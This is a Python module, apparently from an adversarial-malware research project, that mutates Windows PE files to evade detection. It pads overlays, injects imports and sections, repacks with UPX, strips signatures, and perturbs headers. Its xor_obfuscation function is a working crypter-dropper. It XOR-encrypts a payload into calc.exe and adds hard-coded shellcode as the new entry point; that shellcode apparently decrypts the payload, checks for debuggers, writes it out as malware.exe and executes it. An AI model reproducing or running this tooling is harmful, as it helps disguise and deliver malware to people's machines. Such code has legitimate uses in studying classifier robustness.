import lief
import random
import sys
import os
import json
import struct
import array
import tempfile
import subprocess
import signal
import pefile

module_path = os.path.split(os.path.abspath(sys.modules[__name__].__file__))[0]

COMMON_SECTION_NAMES = open(os.path.join(
        module_path, 'section_names.txt'), 'r').read().rstrip().split('\n')
COMMON_IMPORTS = json.load(
            open(os.path.join(module_path, 'small_dll_imports.json'), 'r'))


def lastindex(bytelist):
    for i in range(len(bytelist)-1,0,-1):
        if bytelist[i] != 0:
            return i+1
    return -1

def fparsed_to_bytes(fparsed,im=False):
    builder = lief.PE.Builder(fparsed)
    if im:
        builder.build_imports(True)
        builder.patch_imports(True)
    # builder.build_overlay(True)
    builder.build()
    return array.array('B',builder.get_build()).tobytes()

# success
def overlay_append(fbytes,seed=None):
    random.seed(seed)
    l = 2**random.randint(5,8)
    upper = random.randrange(128)
    new_fbytes = fbytes + bytes([random.randint(0,upper) for _ in range(l)])
    new_fparsed = lief.parse(new_fbytes)
    
    return fparsed_to_bytes(new_fparsed)

def imports_append(fbytes,seed=None):
    random.seed(seed)
    fparsed = lief.parse(fbytes)
    libname = random.choice(list(COMMON_IMPORTS.keys()))
    funcname = random.choice(list(COMMON_IMPORTS[libname]))
    lowerlibname = libname.lower()

    lib = None

    for im in fparsed.imports:
        if im.name.lower() == lowerlibname:
            lib = im
            break
    if lib is None:
        lib = fparsed.add_library(libname)

    names = set([e.name for e in lib.entries])
    if not funcname in names:
        lib.add_entry(funcname)
    
    return fparsed_to_bytes(fparsed, im=True)

# mostly failed
def section_add(fbytes,seed=None):
    random.seed(seed)
    fparsed = lief.parse(fbytes)
    length = random.randrange(1,6)
    new_section = lief.PE.Section("."+"".join(random.sample([chr(i) for i in range(97,123)],length)))

    # fill with random content
    upper = random.randrange(128) # it was 256
    L = 2**random.randint(5,8)
    size = fparsed.optional_header.section_alignment
    new_section.content = [random.randint(0, upper) for _ in range(L)]

    new_section.virtual_size = size 

    new_section.virtual_address = max(
        [s.virtual_address + s.virtual_size for s in fparsed.sections])
    # add a new empty section

    fparsed.add_section(new_section,
                       random.choice([
                           lief.PE.SECTION_TYPES.BSS,
                           lief.PE.SECTION_TYPES.DATA,
                           lief.PE.SECTION_TYPES.EXPORT,
                           lief.PE.SECTION_TYPES.IDATA,
                           lief.PE.SECTION_TYPES.RELOCATION,
                           lief.PE.SECTION_TYPES.RESOURCE,
                           lief.PE.SECTION_TYPES.TEXT,
                           lief.PE.SECTION_TYPES.TLS_,
                           lief.PE.SECTION_TYPES.UNKNOWN,
                       ]))

    return fparsed_to_bytes(fparsed)

# fail
def section_append(fbytes,seed=None):
    random.seed(seed)
    fparsed = lief.parse(fbytes)
    targeted_section = random.choice(fparsed.sections)
    L = 2**random.randint(5,8)
    available_size = targeted_section.size - len(targeted_section.content)

    if targeted_section.virtual_size <= targeted_section.size:
        targeted_section.virtual_size = targeted_section.size
    else:
        targeted_section.size = (int(targeted_section.virtual_size/512)+1)*512

    # print (targeted_section.name)

    if L > available_size:
        L = available_size
    
    upper = random.randrange(128) # it was 256
    temp = list(targeted_section.content)
    temp.append(1)
    #temp = temp + [random.randint(0, upper) for _ in range(L)]
    targeted_section.content = temp

    return fparsed_to_bytes(fparsed)


def upx_pack(fbytes,seed=None):
    # tested with UPX 3.91
    global nfbytes
    nfbytes= bytes(fbytes)
    
    random.seed(seed)
    tmpfilename = os.getcwd()+"/sample/upx/origin.exe"
    # tmpfilename = os.path.join(
    #     tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))

    # dump bytez to a temporary file
    with open(tmpfilename, 'wb') as outfile:
        outfile.write(fbytes)

    options = ['--force', '--overlay=copy']
    compression_level = random.randint(1, 9)
    options += ['-{}'.format(compression_level)]

    options += ['--compress-exports={}'.format(random.randint(0, 1))]
    options += ['--compress-icons={}'.format(random.randint(0, 3))]
    options += ['--compress-resources={}'.format(random.randint(0, 1))]
    options += ['--strip-relocs={}'.format(random.randint(0, 1))]

    with open(os.devnull, 'w') as DEVNULL:
        retcode = subprocess.call(
            ['upx'] + options + [tmpfilename, '-o', tmpfilename.replace(".exe", "_packed.exe")], stdout=DEVNULL, stderr=DEVNULL)

    os.unlink(tmpfilename)

    if retcode == 0:  # successfully packed

        with open(tmpfilename.replace(".exe","_packed.exe"), 'rb') as infile:

            nfbytes = infile.read()

        os.unlink(tmpfilename.replace(".exe","_packed.exe"))

    # fparsed = lief.parse(nfbytes)

    return nfbytes


def upx_unpack(fbytes,seed=None):
    # dump bytez to a temporary file
    global nfbytes
    nfbytes = bytes(fbytes)
    
    tmpfilename = os.getcwd()+"/sample/upx/origin.exe"
    #tmpfilename = os.path.join(
    #    tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))

    with open(tmpfilename, 'wb') as outfile:
        outfile.write(fbytes)

    with open(os.devnull, 'w') as DEVNULL:
        retcode = subprocess.call(
            ['upx', tmpfilename, '-d', '-o', tmpfilename.replace(".exe","_unpacked.exe")], stdout=DEVNULL, stderr=DEVNULL)

    os.unlink(tmpfilename)

    if retcode == 0:  # sucessfully unpacked
        with open(tmpfilename.replace(".exe","_unpacked.exe"), 'rb') as result:
            nfbytes = result.read()

        os.unlink(tmpfilename.replace(".exe","_unpacked.exe"))

    #fparsed = lief.parse(nfbytes)

    return nfbytes #fparsed_to_bytes(fparsed)

def remove_signature(fbytes,seed=None):
    random.seed(seed)
    fparsed = lief.parse(fbytes)

    if fparsed.has_signature:
        for i, e in enumerate(fparsed.data_directories):
            if e.type == lief.PE.DATA_DIRECTORY.CERTIFICATE_TABLE:
                break
        if e.type == lief.PE.DATA_DIRECTORY.CERTIFICATE_TABLE:
            # remove signature from certificate table
            e.rva = 0
            e.size = 0

    return fparsed_to_bytes(fparsed)

def remove_debug(fbytes,seed=None):
    random.seed(seed)
    fparsed = lief.parse(fbytes)

    if fparsed.has_debug:
        for i, e in enumerate(fparsed.data_directories):
            if e.type == lief.PE.DATA_DIRECTORY.DEBUG:
                break
        if e.type == lief.PE.DATA_DIRECTORY.DEBUG:
            # remove signature from certificate table
            e.rva = 0
            e.size = 0

    return fparsed_to_bytes(fparsed)


def break_optional_header_checksum(fbytes,seed=None):
    fparsed = lief.parse(fbytes)
    fparsed.optional_header.checksum = 0

    return fparsed_to_bytes(fparsed)
    

# success
def inject_random_codecave(fbytes):
    fparsed = lief.parse(fbytes)
    random.seed(None)
    while True:
        tsection = random.choice(fparsed.sections)
        if len(tsection.content) != 0:
            break
    # print (target)
    start_index = lastindex(tsection.content)
    content = list(tsection.content)
    content_len = len(content)
    # pert_s = random.randrange(0,content_len-start_index)
    for i in range(start_index+10, start_index+20):
        if i >= content_len:
            break
        content[i] = random.randrange(0,256)
    tsection.content = content

    return fparsed_to_bytes(fparsed)

# success
def section_rename(fbytes):
    random.seed(None)
    length = random.randrange(1,6)
    fparsed = lief.parse(fbytes)
    name = "."+''.join(random.sample([chr(i) for i in range(97,123)], length))
    #print(name)
    targeted_section = random.choice(fparsed.sections)
    targeted_section.name = name
    
    return fparsed_to_bytes(fparsed)

# success
def pert_dos_stub(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)
    dos_stub_info = list(fparsed.dos_stub)
    sindex, eindex = tuple(sorted(random.sample([i for i in range(len(dos_stub_info))],2)))

    # print(fparsed.dos_stub)

    for i in range(sindex,eindex):
        dos_stub_info[i] = random.randrange(0,256)

    # dos_stub_info[0] = 0
    fparsed.dos_stub = dos_stub_info

    return fparsed_to_bytes(fparsed)


# success
def pert_bin_name(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)
    length = random.randrange(1,8)
    name = ''.join(random.sample([chr(i) for i in range(97,123)], length))
    # print (name)
    fparsed.name = name

    return fparsed_to_bytes(fparsed)

# partially success
def pert_optional_header_dllchlist(fbytes):
    fparsed = lief.parse(fbytes)
    chlist = [lief.PE.DLL_CHARACTERISTICS.HIGH_ENTROPY_VA,
              lief.PE.DLL_CHARACTERISTICS.DYNAMIC_BASE,
              lief.PE.DLL_CHARACTERISTICS.FORCE_INTEGRITY,
              lief.PE.DLL_CHARACTERISTICS.NX_COMPAT,
              lief.PE.DLL_CHARACTERISTICS.NO_ISOLATION,
              lief.PE.DLL_CHARACTERISTICS.NO_SEH,
              lief.PE.DLL_CHARACTERISTICS.NO_BIND,
              lief.PE.DLL_CHARACTERISTICS.APPCONTAINER,
              lief.PE.DLL_CHARACTERISTICS.WDM_DRIVER,
              lief.PE.DLL_CHARACTERISTICS.GUARD_CF,
              lief.PE.DLL_CHARACTERISTICS.TERMINAL_SERVER_AWARE]


    fparsed.optional_header.add(chlist[0])
    
    return fparsed_to_bytes(fparsed)

# success
def pert_optional_header_dllch(fbytes):
    fparsed = lief.parse(fbytes)

    fparsed.optional_header.dll_characteristics = random.randrange(0,3000)
    # fparsed.optional_header. 
    return fparsed_to_bytes(fparsed)

# success
def pert_rich_header(fbytes): # add rich header entry
    fparsed = lief.parse(fbytes)
    new_entry = lief.PE.RichEntry()
    new_entry.id = 101
    new_entry.build_id = 0x766f
    new_entry.count = 2

    fparsed.rich_header.add_entry(new_entry)
    
    return fparsed_to_bytes(fparsed)
    
# success
def pert_dos_header(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)

    fparsed.dos_header.initial_ip = random.randint(0,8)
    fparsed.dos_header.initial_relative_ss = random.randint(0,8)
    fparsed.dos_header.overlay_number = random.randint(0,8)
    fparsed.dos_header.oem_id = random.randint(0,8)
    fparsed.dos_header.oem_info = random.randint(0,8) 
    
    return fparsed_to_bytes(fparsed)

def pert_optional_header(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)
    
    temp1 = [ fparsed.optional_header.sizeof_uninitialized_data,
    fparsed.optional_header.sizeof_initialized_data,
    fparsed.optional_header.baseof_code,
    fparsed.optional_header.checksum, 
    fparsed.optional_header.sizeof_heap_reserve,
    fparsed.optional_header.sizeof_stack_commit,
    fparsed.optional_header.win32_version_value,

    fparsed.optional_header.major_linker_version,
    fparsed.optional_header.major_image_version,
    fparsed.optional_header.major_operating_system_version,
    fparsed.optional_header.major_subsystem_version,
    fparsed.optional_header.minor_image_version,
    fparsed.optional_header.minor_linker_version,
    fparsed.optional_header.minor_operating_system_version,
    fparsed.optional_header.minor_subsystem_version]
     
    idx = random.randrange(len(temp1))
    if idx < 6:
        temp1[idx] = random.randrange(0,2**32)
    else:
        temp1[idx] = random.randrange(0,2**8)
    
    
    # fparsed.optional_header.sizeof_stack_reserve =random.randrange(0,2**31)
    # fparsed.optional_header.numberof_rva_and_size = random.randrange(0,2**31)

    return fparsed_to_bytes(fparsed)


def pert_coff_header(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)

    fparsed.header.numberof_symbols = random.randrange(0,2**32)
    fparsed.header.time_date_stamps = random.randrange(0,2**32)
    fparsed.header.pointerto_symbol_table = random.randrange(0,2**32)

    return fparsed_to_bytes(fparsed)

def pert_data_directory(fbytes):
    random.seed(None)
    fparsed = lief.parse(fbytes)

    target = random.choice(fparsed.data_directories)

    target.rva = random.randrange(0,2**32)
    target.size = random.randrange(0,2**32)

    return fparsed_to_bytes(fparsed)

def align(val_to_align, alignment):
    return int((val_to_align + alignment - 1) / alignment) * alignment
def bitwise_xor_bytes(a, b):
    result_int = list(struct.unpack(">i", a))[0] ^ list(struct.unpack(">i", b))[0]
    return struct.pack(">i", result_int)   

# convert negative integer value to hex
def convert(val, nbits):
  return (val + (1 << nbits)) % (1 << nbits)

def adjust_SectionSize(sz, align):
  if sz % align: sz = ((sz + align) // align) * align
  return sz

def xor_obfuscation(fbyte):
    key = 0x8D
    shellcode_enced = []
    for i in fbyte:
       shellcode_enced.append(i ^ key)

    pe = pefile.PE('calc.exe')
    last_section = pe.sections[-1]

    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)

    # fill with zeros
    new_section.__unpack__(bytearray(new_section.sizeof()))

    # place section header after last section header (assume there is enough room)
    new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

    new_section.Name = b'.show'
    new_section_size = len(shellcode_enced)

    new_section.SizeOfRawData = adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
    new_section.PointerToRawData = len(pe.__data__)
    new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
    new_section.VirtualAddress = last_section.VirtualAddress + adjust_SectionSize(last_section.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)

    new_section.Characteristics = 0xE0000040 # read | execute | code

    new_section_data = bytearray(new_section.SizeOfRawData)
    for i in range(len(shellcode_enced)):
        new_section_data[i] = shellcode_enced[i]

    # increase size of image
    pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)
    pe.FILE_HEADER.NumberOfSections += 1

    # append new section to structures
    pe.sections.append(new_section)
    pe.__structures__.append(new_section)

    # add new section data to file
    pe.__data__ = bytearray(pe.__data__) + new_section_data

    # Write the PE file to disk
    pe.write('calc_final.exe')
    pe.close()

    pe = pefile.PE('calc_final.exe')
    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
# call_offset_virus = last_section.VirtualAddress - (pe.sections[-2].VirtualAddress + 0x1e) - 5 
# decryption += b"\xE8" + struct.pack("<i", call_offset_virus)
    last_section = pe.sections[-1]
    # fill with zeros
    new_section.__unpack__(bytearray(new_section.sizeof()))

    # place section header after last section header (assume there is enough room)
    new_section.set_file_offset(last_section.get_file_offset() + last_section.sizeof())

    new_section.Name = b'.decr'
    new_section_size = 4000

    new_section.SizeOfRawData = adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.FileAlignment)
    new_section.PointerToRawData = len(pe.__data__)

    new_section.Misc = new_section.Misc_PhysicalAddress = new_section.Misc_VirtualSize = new_section_size
    new_section.VirtualAddress = last_section.VirtualAddress + adjust_SectionSize(last_section.Misc_VirtualSize, pe.OPTIONAL_HEADER.SectionAlignment)

    new_section.Characteristics = 0xE0000040 # read | execute | code

    virtual_address_virus = last_section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
    shell_decr_cre_exec = bytes.fromhex('558BEC81ECF4010000B86B0000006689850CFFFFFFB96500000066898D0EFFFFFFBA7200000066899510FFFFFFB86E00000066898512FFFFFFB96500000066898D14FFFFFFBA6C00000066899516FFFFFFB83300000066898518FFFFFFB93200000066898D1AFFFFFFBA2E0000006689951CFFFFFFB8640000006689851EFFFFFFB96C00000066898D20FFFFFFBA6C00000066899522FFFFFF33C066898524FFFFFFC645A04CC645A16FC645A261C645A364C645A44CC645A569C645A662C645A772C645A861C645A972C645AA79C645AB41C645AC00C6459047C6459165C6459274C6459350C6459472C645956FC6459663C6459741C6459864C6459964C6459A72C6459B65C6459C73C6459D73C6459E00C645D475C645D573C645D665C645D772C645D833C645D932C645DA2EC645DB64C645DC6CC645DD6CC645DE00C645C84DC645C965C645CA73C645CB73C645CC61C645CD67C645CE65C645CF42C645D06FC645D178C645D257C645D300C68558FFFFFF49C68559FFFFFF73C6855AFFFFFF44C6855BFFFFFF65C6855CFFFFFF62C6855DFFFFFF75C6855EFFFFFF67C6855FFFFFFF67C68560FFFFFF65C68561FFFFFF72C68562FFFFFF50C68563FFFFFF72C68564FFFFFF65C68565FFFFFF73C68566FFFFFF65C68567FFFFFF6EC68568FFFFFF74C68569FFFFFF00C68544FFFFFF47C68545FFFFFF65C68546FFFFFF74C68547FFFFFF43C68548FFFFFF75C68549FFFFFF72C6854AFFFFFF72C6854BFFFFFF65C6854CFFFFFF6EC6854DFFFFFF74C6854EFFFFFF50C6854FFFFFFF72C68550FFFFFF6FC68551FFFFFF63C68552FFFFFF65C68553FFFFFF73C68554FFFFFF73C68555FFFFFF00C68528FFFFFF43C68529FFFFFF68C6852AFFFFFF65C6852BFFFFFF63C6852CFFFFFF6BC6852DFFFFFF52C6852EFFFFFF65C6852FFFFFFF6DC68530FFFFFF6FC68531FFFFFF74C68532FFFFFF65C68533FFFFFF44C68534FFFFFF65C68535FFFFFF62C68536FFFFFF75C68537FFFFFF67C68538FFFFFF67C68539FFFFFF65C6853AFFFFFF72C6853BFFFFFF50C6853CFFFFFF72C6853DFFFFFF65C6853EFFFFFF73C6853FFFFFFF65C68540FFFFFF6EC68541FFFFFF74C68542FFFFFF00C645E057C645E172C645E269C645E374C645E465C645E546C645E669C645E76CC645E865C645E900C645BC43C645BD72C645BE65C645BF61C645C074C645C165C645C246C645C369C645C46CC645C565C645C641C645C700C68570FFFFFF43C68571FFFFFF72C68572FFFFFF65C68573FFFFFF61C68574FFFFFF74C68575FFFFFF65C68576FFFFFF50C68577FFFFFF72C68578FFFFFF6FC68579FFFFFF63C6857AFFFFFF65C6857BFFFFFF73C6857CFFFFFF73C6857DFFFFFF57C6857EFFFFFF00C645B043C645B16CC645B26FC645B373C645B465C645B548C645B661C645B76EC645B864C645B96CC645BA65C645BB00C645802EC645815CC645826DC6458361C645846CC6458565C6458677C6458761C6458872C6458965C6458A2EC6458B65C6458C78C6458D65C6458E00B92E00000066898DECFEFFFFBA5C000000668995EEFEFFFFB86D000000668985F0FEFFFFB96100000066898DF2FEFFFFBA6C000000668995F4FEFFFFB865000000668985F6FEFFFFB97700000066898DF8FEFFFFBA61000000668995FAFEFFFFB872000000668985FCFEFFFFB96500000066898DFEFEFFFFBA2E00000066899500FFFFFFB86500000066898502FFFFFFB97800000066898D04FFFFFFBA6500000066899506FFFFFF33C066898508FFFFFFB93200000066898D6CFEFFFFBA300000006689956EFEFFFFB83500000066898570FEFFFFB93200000066898D72FEFFFFBA3000000066899574FEFFFFB83100000066898576FEFFFFB93700000066898D78FEFFFFBA330000006689957AFEFFFFB85F0000006689857CFEFFFFB93200000066898D7EFEFFFFBA3000000066899580FEFFFFB83500000066898582FEFFFFB93200000066898D84FEFFFFBA3000000066899586FEFFFFB83200000066898588FEFFFFB93400000066898D8AFEFFFFBA380000006689958CFEFFFFB85F0000006689858EFEFFFFB93200000066898D90FEFFFFBA3000000066899592FEFFFFB83500000066898594FEFFFFB93200000066898D96FEFFFFBA3100000066899598FEFFFFB8360000006689859AFEFFFFB93800000066898D9CFEFFFFBA330000006689959EFEFFFF33C0668985A0FEFFFFB94900000066898DA4FEFFFFBA6E000000668995A6FEFFFFB866000000668985A8FEFFFFB96500000066898DAAFEFFFFBA63000000668995ACFEFFFFB874000000668985AEFEFFFFB96900000066898DB0FEFFFFBA6F000000668995B2FEFFFFB86E000000668985B4FEFFFFB92000000066898DB6FEFFFFBA62000000668995B8FEFFFFB879000000668985BAFEFFFFB92000000066898DBCFEFFFFBA4E000000668995BEFEFFFFB854000000668985C0FEFFFFB93200000066898DC2FEFFFFBA33000000668995C4FEFFFFB830000000668985C6FEFFFF33C966898DC8FEFFFF8D950CFFFFFF52E8F502000083C4048945FC8D45A0508B4DFC51E88801000083C4088985E8FEFFFF8D5590528B45FC50E87201000083C4088985E4FEFFFF8B8DE8FEFFFF898DE0FEFFFF8B95E4FEFFFF8955F88D45D450FF95E0FEFFFF8985DCFEFFFF8D4DC8518B95DCFEFFFF52FF55F8898568FEFFFF8D45BC508B4DFC51FF55F88985D8FEFFFF8D55E0528B45FC50FF55F88985D4FEFFFF8D4DB0518B55FC52FF55F88985D0FEFFFF6A0068800000006A016A006A0168000000408D458050FF95D8FEFFFF89856CFFFFFF83BD6CFFFFFFFF750AB802000000E9C4000000')
    shell_decr_cre_exec += b"\x90"*27 + b"\xBA" + struct.pack("<i", virtual_address_virus)                                   
    shell_decr_cre_exec += bytes.fromhex('C645F4656A008D8D64FEFFFF51')
    shell_decr_cre_exec += b"\x68" + struct.pack("<i", len(shellcode_enced)) 
    shell_decr_cre_exec += bytes.fromhex('528B856CFFFFFF50FF95D4FEFFFF898560FEFFFF8B8D6CFFFFFF51FF95D0FEFFFF8D9570FFFFFF528B45FC50FF55F88985CCFEFFFF8D850CFEFFFFB9440000008BF833C0FCF3AAC7850CFEFFFF440000008D8550FEFFFFB9100000008BF833C0FCF3AA8D8550FEFFFF508D8D0CFEFFFF516A006A006A006A006A006A008D95ECFEFFFF526A00FF95CCFEFFFFEB02EB0233C08BE55DC3558BEC83EC3C8B45088945EC8B4DEC0FB71181FA4D5A0000740733C0E9350100008B45EC8B4D0803483C894DE4BA080000006BC2008B4DE48D5401788955E88B45E8833800750733C0E9080100008B4DE88B118955E08B45E00345088945F48B4DF48B51188955DC8B45F48B481C894DD08B55F48B42208945D88B4DF48B51248955D4C745F800000000EB098B45F883C0018945F88B4DF83B4DDC0F83B30000008B55080355D88B45F88D0C82894DC88B55080355D48B45F88D0C42894DCC8B55080355D08B45CC0FB7088D148A8955C48B45C88B4D080308894DF0C745FC00000000C745FC00000000EB098B55FC83C2018955FC8B450C0345FC0FBE0885C974278B55F00355FC0FBE0285C0741A8B4D0C034DFC0FBE118B45F00345FC0FBE083BD17402EB02EBC38B550C0355FC0FBE0285C075198B4DF0034DFC0FBE1185D2750C8B45C48B4D0803088BC1EB07E938FFFFFF33C08BE55DC3558BEC83EC34C745E40000000064A1300000008945E48B4DE48B510C8955D88B45D88B480C8B5010894DCC8955D08B45CC8945D48B4DD4894DE8837DE8000F845A0100008B55E8837A18000F844D0100008B45E8837830007502EBDE8B4DE88B51308955ECC745F000000000C745F000000000EB098B45F083C0018945F08B4DF08B55080FB7044A85C00F84DD0000008B4DF08B55EC0FB7044A85C00F84CB0000008B4DF08B55080FB7044A83F85A7F378B4DF08B55080FB7044A83F8417C288B4DF08B55080FB7044A83C0208945E08B4DF08B5508668B45E06689044A668B4DE066894DFEEB0E8B55F08B4508668B0C5066894DFE668B55FE668955F88B45F08B4DEC0FB7144183FA5A7F378B45F08B4DEC0FB7144183FA417C288B45F08B4DEC0FB7144183C2208955DC8B45F08B4DEC668B55DC66891441668B45DC668945FCEB0E8B4DF08B55EC668B044A668945FC668B4DFC66894DF40FB755F80FB745F43BD07402EB05E908FFFFFF8B4DF08B55080FB7044A85C075168B4DF08B55EC0FB7044A85C075088B4DE88B4118EB0F8B55E88B028945E8E99CFEFFFF33C08BE55DC300000000000000000000000000002FBD6F64000000000D000000')

    temp = b"\x8D\x35" + struct.pack("<i", virtual_address_virus)
    temp += b"\xB9"+ struct.pack("<i", len(shellcode_enced))
    temp += b"\x81\x36\x8D\x8D\x8D\x8D\x83\xC6\x04\x83\xE9\x04\x83\xF9\x00\x0F\x85\xEB\xFF\xFF\xFF"
    shell_decr_cre_exec = temp + shell_decr_cre_exec

    new_section_data = bytearray(new_section.SizeOfRawData)
    for i in range(len(shell_decr_cre_exec)):
        new_section_data[i] = shell_decr_cre_exec[i]
    
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

    # increase size of image
    pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(new_section_size, pe.OPTIONAL_HEADER.SectionAlignment)

    # increase number of sections
    pe.FILE_HEADER.NumberOfSections += 1

    # append new section to structures
    pe.sections.append(new_section)
    pe.__structures__.append(new_section)

    # add new section data to file
    pe.__data__ = bytearray(pe.__data__) + new_section_data
    pe.write("calc_final.exe")
    pe.close()

    f = open("calc_final.exe", "rb").read()
    return f



def build_lief(fbytes,fname):
    fparsed = lief.parse(fbytes)
    builder = lief.PE.Builder(fparsed)
    builder.build()
    new_fname = fname.replace(".exe","_m.exe")
    builder.write(new_fname)

def build_lief_name(fbytes,fname,pertname):
    pe = pefile.PE(fname)
    fparsed = lief.parse(fbytes)
    builder = lief.PE.Builder(fparsed)
    # builder.build_imports(True)
    builder.build()
    new_fname = fname.replace(".exe","_"+pertname+".exe")
    builder.write(new_fname)

    pe2 = pefile.PE(new_fname)

    if pe.OPTIONAL_HEADER.SizeOfHeaders != pe2.OPTIONAL_HEADER.SizeOfHeaders:
        pe2.OPTIONAL_HEADER.SizeOfHeaders = pe.OPTIONAL_HEADER.SizeOfHeaders

    pe2.write(new_fname)
